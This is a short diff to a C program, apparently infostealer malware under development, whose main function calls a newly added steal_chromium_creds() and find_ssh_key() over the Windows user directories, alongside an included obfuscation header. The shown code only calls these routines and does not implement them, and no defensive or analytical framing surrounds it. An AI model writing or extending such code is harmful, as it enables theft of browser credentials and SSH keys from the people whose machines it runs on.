@@ -3,13 +3,21 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <windows.h>
 
+#include "chromium.h"
 #include "find_ssh_key.h"
 #include "obfuscation.h"
 
 void hello(void) { printf("Hello World\n"); }
 
 int main(void) {
+  // Puts the console in UTF-8
+  // Allows us to print non-ASCII characters for debug
+  SetConsoleOutputCP(CP_UTF8);
+
+  hello();
+  steal_chromium_creds();
   find_ssh_key(L"C:\\Users");
 
   char str[] = "BOFFE";
